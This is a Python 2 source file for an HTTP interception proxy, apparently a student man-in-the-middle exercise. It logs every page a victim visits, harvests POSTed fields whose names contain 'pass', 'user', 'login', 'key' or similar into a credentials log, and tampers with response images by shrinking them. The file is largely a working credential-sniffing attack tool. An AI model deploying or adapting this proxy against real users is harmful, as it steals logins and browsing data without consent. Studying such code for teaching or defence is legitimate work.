from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import StringIO
from urlparse import urlparse
import httplib
import logging
import re
import zlib
from PIL import Image

HOST_NAME = ''
PORT_NUMBER = 4570







class Proxy_Server(BaseHTTPRequestHandler):
    interesting_parameters_list = ['pass', 'user', 'name', 'login', 'mail', 'key', 'ticket']
    image_format_list = ['bmp', 'jpg', 'jpeg', 'png']


    def response_content_handler(self, headers, body):
        #  checking for image
        content_type = ''
        content_encoding = ''
        for key in headers:
            if key.lower() == 'content-type':
                content_type = headers[key]
            if key.lower() == 'content-encoding':
                content_encoding = headers[key]
        if len(re.findall('image', content_type)) < 1:
            return headers, body

        #  uncompresing
        encoded_body = body
        if content_encoding == 'gzip':
            encoded_body = zlib.decompress(body)


        #  handling image
        im = Image.open(StringIO.StringIO(encoded_body))
        if im.format.lower() not in self.image_format_list:
            return headers, body
        out = im
        try:
            out = im.resize(((im.size[0]+1)/2, (im.size[1]+1)/2))
        except:
            print 'Fabolous exception'
        if out.size != ((im.size[0]+1)/2, (im.size[1]+1)/2):
            out = im

        output_image_buffer = StringIO.StringIO()
        try:
            out.save(output_image_buffer, format=out.format)
        except:
            output_image_buffer.close()
            return headers, body
        output_image = output_image_buffer.getvalue()
        output_image_buffer.close()

        for key in headers:
            if key.lower() == 'content-length':
                headers[key] = len(output_image)

        return headers, output_image




    def password_catcher(self, body):
        parameters = body.split('&')
        if len(parameters) < 2:
            return
        found_interesting_val = []
        for kv_pair in parameters:
            for interesting_parameters_list_value in self.interesting_parameters_list:
                if len(re.findall(interesting_parameters_list_value, kv_pair)) > 0:
                    found_interesting_val.append(kv_pair)
                    break
        return found_interesting_val


    def do_GET(self):
        global proxy_page_visit_logger
        global password_logger
        proxy_page_visit_logger.info(self.path)

        #  getting data from Alice, checking login credentials
        request_method = self.command
        request_url = self.path
        _request_len = self.headers.getheader('content-length')
        request_body = self.rfile.read(0 if _request_len is None else int(_request_len))
        request_headers = self.headers.dict  # as dictionary

        if request_method == 'POST':
            interesting_val = self.password_catcher(request_body)
            if len(interesting_val) > 0:
                log_info = self.path
                for val in interesting_val:
                    log_info += ' ' + val
                password_logger.info(log_info)  # the same page may be logged twice. This is done on purpose

        #  connecting to Bob
        parsed_url = urlparse(request_url)
        fact = httplib.HTTPSConnection if parsed_url.scheme == 'https' else httplib.HTTPConnection
        conn = fact(parsed_url.netloc)
        conn.request(request_method, parsed_url.path + '?' + parsed_url.query, headers=request_headers,
                     body=request_body)

        #  geting response from Bob
        resp = conn.getresponse()
        respone_data = ''
        _buff_size = 0
        while True:
            _buff_line = resp.read(1)
            if _buff_line == '':
                break
            _buff_size = _buff_size + 1
            respone_data += _buff_line
        foo = str(_buff_size)
        respone_headers = dict(resp.msg.dict)  # wywalic transfer encoding i dac content len, co sie dzieje z kodowaniem?
        for key in respone_headers:
            if key.lower() == 'Transfer-Encoding'.lower() and respone_headers[key].lower == 'chunked':
                respone_headers.pop(key, None)
                break
        for key in respone_headers:
            if key.lower() == 'Connection'.lower():
                respone_headers.pop(key, None)
                break
        respone_headers['Connection'] = 'close'

        for key in respone_headers:
            if key.lower() == 'Content-Length'.lower():
                respone_headers.pop(key, None)
                break

        respone_headers, respone_data = self.response_content_handler(respone_headers, respone_data)

        # replying to Alice
        self.send_response(resp.status)
        for key in respone_headers:
            self.send_header(key, respone_headers[key])
        # self.send_header("Content-type", "text/html; charset=utf-8") #  example header
        self.end_headers()
        self.wfile.write(respone_data)

    do_POST = do_GET
    do_CONNECT = do_GET


if __name__ == "__main__":
    # URL = 'http://www.tcs.uj.edu.pl/wydarzenia'
    # URL = 'http://www.portal.uj.edu.pl/documents/35126571/ab59a209-60eb-451e-9489-0ab3c7facb00'
    # url = urlparse(URL)
    # print url
    # fact = httplib.HTTPSConnection if url.scheme == 'https' else httplib.HTTPConnection
    # conn = fact(url.netloc)
    # conn.request("GET", url.path + '?' + url.query)
    # resp = conn.getresponse()
    # print resp.status, resp.reason
    # data = resp.read()
    # pass

    logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
    proxy_page_visit_logger = logging.getLogger('VISIT')
    password_logger = logging.getLogger('CREDENTIALS')
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), Proxy_Server)
    while 1:
        try:
            httpd.serve_forever()
        except:
            pass

